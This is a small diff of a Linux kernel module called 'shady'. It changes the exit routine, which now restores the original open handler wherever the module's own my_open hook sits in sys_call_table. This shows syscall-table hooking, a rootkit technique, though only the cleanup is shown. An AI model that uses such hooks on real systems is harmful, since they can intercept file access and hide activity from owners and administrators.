@@ -44,10 +44,9 @@ static int __init shady_init_module(void) {
 static void __exit shady_exit_module(void) {
 	int i;
 	void** sct = (void**)kallsyms_lookup_name("sys_call_table");
-	unsigned long opn_addr = kallsyms_lookup_name("sys_open");
 	for(i = 0; i < 20; i++)
 	{
-		if((unsigned long)sct[i] == opn_addr)
+		if((unsigned long)sct[i] == &my_open)
 		{
 			sct[i] = old_open;
 		}
